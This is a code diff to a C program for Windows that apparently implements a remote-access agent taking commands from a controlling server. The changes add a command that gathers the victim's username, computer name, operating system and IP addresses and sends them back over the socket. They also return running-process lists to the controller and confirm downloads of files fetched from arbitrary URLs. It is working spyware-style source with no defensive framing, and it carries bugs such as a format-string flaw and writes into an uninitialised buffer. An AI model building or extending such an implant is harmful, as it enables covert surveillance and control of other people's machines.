@@ -70,8 +70,7 @@ int main(int argc, char* argv[]) {
             printf("Received: %s", recvbuf);
             iResult = parseCommand(ConnectSocket, recvbuf);
             if(iResult==0) {
-                strcpy(response, "OK");
-                sendMsg(ConnectSocket, response);
+                // do nothing
             } else if (iResult==1) {
                 strcpy(response, "BAD COMMAND");
                 sendMsg(ConnectSocket, response);
@@ -122,7 +121,7 @@ int parseCommand(SOCKET sock, char* input) {
         }
     } else if (strcmp(args[0], "download") == 0) {
         if (argCount == 3) {
-            return cmdDownload(args[1], args[2]);
+            return cmdDownload(sock, args[1], args[2]);
         } else {
             printf("Invalid arguments for download command.\n");
             return 1;
@@ -140,6 +139,62 @@ int cmdShutdown() {
 
 int cmdInform(SOCKET sock) {
     printf("Executing inform\n");
+
+    char msg[DEFAULT_BUFLEN];
+    memset(msg, 0, DEFAULT_BUFLEN);
+    char separator = '\n';
+
+    // Get the user's username
+    char* username = getenv("USERNAME");
+    strncat(msg, username, strlen(username));
+    strncat(msg, &separator, 1);
+
+    // Get the PC name
+    DWORD hostnameLength = 256;
+    char hostname[256];
+    GetComputerNameA(hostname, &hostnameLength);
+    strncat(msg, hostname, strlen(hostname));
+    strncat(msg, &separator, 1);
+
+    // Get the OS? It will always be Windows
+    #ifdef _WIN32
+        const char* os = "Windows";
+	    strncat(msg, os, strlen(os));
+	#elif __linux__
+	    const char* os = "Linux";
+	    strncat(msg, os, strlen(os));
+	#elif __unix__
+	    const char* os = "UNIX";
+	    strncat(msg, os, strlen(os));
+	#else
+	    const char* os = "Unknown OS";
+	    strncat(msg, os, strlen(os));
+	#endif
+    strncat(msg, &separator, 1);
+
+    // Get IP addresses
+    DWORD val;
+    ULONG outBufLen = DEFAULT_BUFLEN;
+    val = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &outBufLen);
+    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES) malloc(outBufLen);
+    val = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
+    PIP_ADAPTER_ADDRESSES aa;
+    PIP_ADAPTER_UNICAST_ADDRESS ua;
+
+    for (aa = pAddresses; aa != NULL; aa = aa->Next) {
+		for (ua = aa->FirstUnicastAddress; ua != NULL; ua = ua->Next) {
+            char pIP[32];
+            memset(pIP, 0, 32);
+            printf("unicast: %x", ua->Address.lpSockaddr);
+            getnameinfo(ua->Address.lpSockaddr, ua->Address.iSockaddrLength, pIP, sizeof(pIP), NULL, 0, NI_NUMERICHOST);
+
+            strncat(msg, pIP, strlen(pIP));
+            strncat(msg, &separator, 1);
+		}
+	}
+    free(pAddresses);
+
+    sendMsg(sock, msg);
     return 0;
 }
 
@@ -147,8 +202,7 @@ int cmdProc(SOCKET sock) {
     DWORD processes[DEFAULT_BUFLEN];
     DWORD cbNeeded;
 
-    char msg[DEFAULT_BUFLEN];
-    memset(msg, 0, DEFAULT_BUFLEN);
+    char* message = (char*)malloc(DEFAULT_BUFLEN);
 
     if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
         DWORD numProcesses = cbNeeded / sizeof(DWORD);
@@ -161,21 +215,23 @@ int cmdProc(SOCKET sock) {
                 HMODULE hMod;
                 if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ) {
                     if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
-                        printf("Process ID: %d, Process Name: %s\n", processes[i], processName);
                         sprintf(p, "Process ID: %d, Process Name: %s\n", processes[i], processName);
 
                         const char* cc = (const char*)p;
 
-                        strncat(msg, cc, strlen(cc));
+                        strncat(message, cc, strlen(cc));
                     }
                     CloseHandle(hProcess);
                 }   
             }
         }
-        sendMsg(sock, msg);
+        printf(message);
+        sendMsg(sock, message);
     } else {
+        free(message);
         return -1;
     }
+    free(message);
     return 0;
 }
 
@@ -209,7 +265,7 @@ int cmdUpload(SOCKET sock, char* filepath) {
     return 0;
 }
 
-int cmdDownload(char* filename, char* cUrl) {
+int cmdDownload(SOCKET sock, char* filename, char* cUrl) {
     printf("Executing cmdDownload() with args: %s, %s\n", filename, cUrl);
 
     HINTERNET hInternet, hUrl;
@@ -256,9 +312,6 @@ int cmdDownload(char* filename, char* cUrl) {
     InternetCloseHandle(hUrl);
     InternetCloseHandle(hInternet);
 
-    printf("File downloaded successfully.\n");
-
-    return 0;
-
+    sendMsg(sock, "File downloaded successfully.");
     return 0;
 }
